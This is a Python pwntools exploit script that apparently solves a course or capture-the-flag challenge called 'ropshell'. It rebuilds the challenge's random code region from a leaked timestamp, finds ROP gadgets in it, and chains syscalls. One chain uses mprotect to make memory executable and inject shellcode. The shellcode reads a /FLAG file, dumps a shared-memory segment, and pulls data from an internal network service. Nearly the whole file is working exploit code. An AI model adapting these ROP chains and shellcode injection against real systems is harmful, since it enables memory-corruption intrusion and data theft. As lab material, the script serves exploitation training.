#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import ctypes
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

libc = ctypes.CDLL('libc.so.6')

class CodeNotFoundError(Exception):
    pass

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if 'pause' in sys.argv[1:]:
    pause()

len_code = 10 * 0x10000

print(r.recvuntil(b'Timestamp is ').decode("utf-8"), end = '')
timestamp = int(r.recvline(keepends=False))
print(timestamp)
print(r.recvuntil(b'** Random bytes generated at ').decode("utf-8"), end = '')
code_start = int(r.recvline(keepends=False), 16)
print(hex(code_start))

libc.srand(timestamp)

mask = 2 ** 32 - 1
codeint = [(libc.rand()<<16 & mask) | (libc.rand() & 0xffff) for _ in range(len_code//4)]
k = libc.rand() % (len_code//4 - 1)
codeint[k] = 0xc3050f

code_bytes = b''.join([struct.pack("I", codeint[i]) for i in range(len(codeint))])

def code_bytes_find(code):
    pos = code_bytes.find(asm(code))
    if pos != -1:
        return pos
    raise CodeNotFoundError(code)
    
pop_rax = code_bytes_find("pop rax; ret") + code_start
pop_rdi = code_bytes_find("pop rdi; ret") + code_start
pop_rsi = code_bytes_find("pop rsi; ret") + code_start
pop_rdx = code_bytes_find("pop rdx; ret") + code_start
syscall = code_bytes_find("syscall; ret") + code_start
retn = code_bytes_find("ret") + code_start

# Task 1 : normal termination
print(r.recvuntil(b'shell> ', drop=True).decode("utf-8"), end='')
print("Task 1")

payload = b''
payload += p64(pop_rax)
payload += p64(60)
payload += p64(pop_rdi)
payload += p64(37)
payload += p64(syscall)

r.send(payload)

# Task 2 : show flag stored in the /FLAG file
print(r.recvuntil(b'shell> ', drop=True).decode("utf-8"))
print("Task 2")

payload = b''
payload += p64(pop_rdx)
payload += p64(7)
payload += p64(pop_rsi)
payload += p64(0x2000)
payload += p64(pop_rdi)
payload += p64(code_start)
payload += p64(pop_rax)
payload += p64(10)
payload += p64(syscall) # mprotect(code, LEN_CODE, PROT_WRITE|PROT_READ|PROT_EXEC)

payload += p64(pop_rdx)
payload += p64(0x2000)
payload += p64(pop_rsi)
payload += p64(code_start)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall) # read(0, code, LEN_CODE)

payload += p64(code_start)

r.send(payload)

sc = shellcraft.amd64.linux.readfile('/FLAG', 1)
sc += shellcraft.amd64.linux.exit(0)

r.send(asm(sc))

# Task 3 : show flag stored in the shared memory
print(r.recvuntil(b'shell> ', drop=True).decode("utf-8"))
print("Task 3")
r.send(payload)


sc = """    
    /* call shmget(key=0x1337, size=4096, shmflg=0444) */
    push    SYS_shmget /* 0x1d */
    pop     rax
    mov     edx, 292
    mov     esi, 4096
    mov     edi, 4919
    syscall

    /* Save file descripter for later */
    mov     rbx, rax

    /* call shmat(shmid, shmaddr, shmflg=SHM_RDONLY) */
    push    SYS_shmat /* 0x1e */
    pop     rax
    mov     edx, 4096
    mov     esi, 0
    mov     rdi, rbx
    syscall

    /* Save shm pointer for later */
    mov     r9, rax
"""
sc += shellcraft.amd64.strlen('r9')
sc += shellcraft.amd64.linux.write(1, 'r9', 'rcx')
sc += shellcraft.amd64.linux.exit(0)

r.send(asm(sc))

# Task 4 : show flag received from the internal network server
print(r.recvuntil(b'shell> ', drop=True).decode("utf-8"))
print("Task 4")
r.send(payload)

sc = shellcraft.amd64.linux.connect('127.0.0.1', 0x1337)
sc += shellcraft.read('rbp','rsp',4096)
sc += shellcraft.amd64.strlen('rsp')
sc += shellcraft.write(1,'rsp', 'rcx')
sc += shellcraft.amd64.linux.exit(0)

r.send(asm(sc))

print(r.recvuntil(b'shell> ', drop=True).decode("utf-8"))
r.close()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
